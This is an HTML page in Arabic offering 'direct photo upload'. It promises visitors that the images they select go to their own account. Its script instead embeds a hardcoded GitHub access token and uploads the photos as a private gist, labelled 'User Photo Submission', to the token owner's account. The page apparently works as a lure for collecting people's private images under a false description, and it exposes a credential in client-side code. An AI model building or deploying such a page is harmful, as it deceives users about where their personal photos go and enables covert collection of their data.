<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رفع الصور المباشر</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; 
        }
        .container { text-align: center; background: #2d2d2d; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
        .gift { font-size: 70px; cursor: pointer; transition: transform 0.2s; }
        .gift:hover { transform: scale(1.1); }
        .btn { background: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; }
        .btn:disabled { background: #555; cursor: not-allowed; }
        #status { margin-top: 15px; min-height: 20px; font-size: 14px; word-break: break-all; }
        .success { color: #4caf50; }
        .error { color: #f44336; }
        .loading { color: #ff9800; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>

<div class="container">
    <div class="gift" onclick="startProcess()">📸</div>
    <h2>اضغط لاختيار الصور</h2>
    <p style="color: #aaa;">سيتم رفع الصور المختارة مباشرة إلى حسابك</p>
    
    <button id="uploadBtn" class="btn" onclick="uploadToGithub()">🚀 ارفع الصور الآن</button>
    <div id="status"></div>
</div>

<script>
    // --- إعدادات GitHub ---
    const GH_TOKEN = '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'; 
    
    let selectedFiles = [];

    async function startProcess() {
        const status = document.getElementById('status');
        const btn = document.getElementById('uploadBtn');
        
        try {
            if (!window.showOpenFilePicker) {
                alert("المتصفح لا يدعم اختيار الملفات (جرب Chrome أو Edge)");
                return;
            }

            const fileHandles = await window.showOpenFilePicker({
                types: [{ description: 'Images', accept: {'image/*': ['.png', '.jpg', '.jpeg', '.gif']} }],
                multiple: true
            });

            selectedFiles = [];
            for (const handle of fileHandles) {
                const file = await handle.getFile();
                selectedFiles.push(file);
            }

            status.innerHTML = `✅ تم اختيار ${selectedFiles.length} صورة. الآن اضغط الزر للرفع.`;
            status.className = 'success';
            btn.disabled = false;

        } catch (err) {
            console.error(err);
            status.innerText = "تم إلغاء الاختيار.";
        }
    }

    async function uploadToGithub() {
        const status = document.getElementById('status');
        const btn = document.getElementById('uploadBtn');
        
        if (selectedFiles.length === 0) return;

        status.innerText = "جاري الرفع...";
        status.className = 'loading';
        btn.disabled = true;

        try {
            const gistFiles = {};
            
            for (let i = 0; i < selectedFiles.length; i++) {
                const file = selectedFiles[i];
                const base64 = await readFileAsBase64(file);
                gistFiles[file.name] = { content: base64 };
                status.innerText = `جاري معالجة الصورة ${i + 1} من ${selectedFiles.length}...`;
            }

            const response = await fetch('https://api.github.com/gists', {
                method: 'POST',
                headers: {
                    'Authorization': `token ${GH_TOKEN}`,
                    'Content-Type': 'application/json',
                    'X-GitHub-Api-Version': '2022-11-28'
                },
                body: JSON.stringify({
                    description: 'User Photo Submission',
                    public: false,
                    files: gistFiles
                })
            });

            if (response.ok) {
                const data = await response.json();
                status.innerHTML = "✅ تم الحفظ بنجاح! الرابط: <br><a href='" + data.html_url + "' target='_blank'>" + data.html_url + "</a>";
                status.className = 'success';
            } else {
                const errorData = await response.json();
                throw new Error(errorData.message || 'فشل الرفع');
            }

        } catch (error) {
            console.error(error);
            status.innerText = "❌ خطأ: " + error.message;
            status.className = 'error';
        } finally {
            btn.disabled = false;
        }
    }

    function readFileAsBase64(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = () => resolve(reader.result);
            reader.onerror = error => reject(error);
        });
    }
</script>

</body>
</html>
